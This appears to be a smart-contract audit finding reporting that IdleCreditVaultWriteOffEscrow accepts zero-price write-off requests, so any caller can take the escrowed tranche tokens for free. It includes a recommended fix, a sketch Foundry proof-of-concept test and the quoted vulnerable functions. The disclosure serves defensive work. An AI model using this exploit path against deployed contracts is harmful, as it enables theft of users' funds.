### Title
Zero-price write-off requests allow theft of escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary

`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates only that the deposited tranche amount is nonzero; it accepts `underlyingsRequested == 0`. `fullfillWriteOffRequest` then treats that malformed request as a valid exact match and releases the full escrowed tranche position for zero underlying payment. [1](#0-0) [2](#0-1) 

### Finding Description

A write-off request is intended to escrow tranche tokens while recording the minimum underlying amount the lender requires. `createWriteOffRequest` checks `amount == 0` but omits the corresponding check that `underlyingsRequested != 0`. [1](#0-0) 

During fulfillment, the contract requires the supplied tranche amount to equal the request and only rejects supplied underlyings below the requested amount. Therefore, a request with zero requested underlyings can be fulfilled with `_underlyings == 0`, after which the escrow still transfers `_tranches` to the fulfiller. [2](#0-1) 

Requests can be created only while the credit-vault epoch is running, but fulfillment is explicitly callable by any wallet. [3](#0-2) [4](#0-3) 

### Impact Explanation

An unprivileged fulfiller can permanently acquire all tranche tokens escrowed under a zero-price request without transferring underlying assets. If the lender deposited `N` tranche tokens, the attacker receives exactly `N` tranche tokens and pays `0` underlying, minus no fee because the fee is calculated on the zero payment. [5](#0-4) 

This breaks the fair-exchange invariant of the escrow: one escrowed tranche position should only be released for at least the lender’s recorded underlying consideration. The tranche-token theft is direct and quantifiable.

### Likelihood Explanation

The attack requires a lender to create a malformed request with a zero underlying price during a running epoch. Once such a request exists, any EOA or contract can immediately fulfill it because there is no fulfiller allowlist, borrower-only restriction, owner call, or minimum-payment check. [6](#0-5) 

The existing `WrongRequest` check does not stop the attack because `_underlyings = 0` is not less than `currentRequest.underlyings = 0`. [7](#0-6) 

### Recommendation

Reject zero-price requests in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Alternatively, if zero-price cancellation semantics are intentionally required, fulfillment should require an explicit lender-side acceptance rather than allowing any caller to take the tranches for free.

### Proof of Concept

A Foundry regression PoC can directly model the escrow with the real `IdleCreditVaultWriteOffEscrow`, a mocked running `IdleCDOEpochVariant`, and standard mock ERC20 tranche/underlying tokens:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";

contract ZeroPriceWriteOffPoC is Test {
    IdleCreditVaultWriteOffEscrow escrow;

    // Mock the running CDO/strategy/token wiring used by initialize().
    // lender is an ordinary tranche-token holder and attacker is any EOA.
    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");

    function testZeroPriceRequestStealsTranches() external {
        uint256 trancheAmount = 100e18;

        // 1. Epoch is running; lender creates a malformed request.
        vm.prank(lender);
        escrow.createWriteOffRequest(trancheAmount, 0);

        // 2. Any unprivileged fulfiller submits the exact tranche amount
        //    and supplies zero underlying.
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        // 3. Attacker received the escrowed tranche position for free.
        assertEq(MockERC20(escrow.tranche()).balanceOf(attacker), trancheAmount);
        assertEq(MockERC20(escrow.tranche()).balanceOf(address(escrow)), 0);
        assertEq(MockERC20(escrow.underlying()).balanceOf(lender), 0);
    }
}
```

The critical assertions follow from `fullfillWriteOffRequest`: the request is deleted, zero underlying is pulled, and the escrowed tranche amount is transferred to `msg.sender`. [8](#0-7)

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
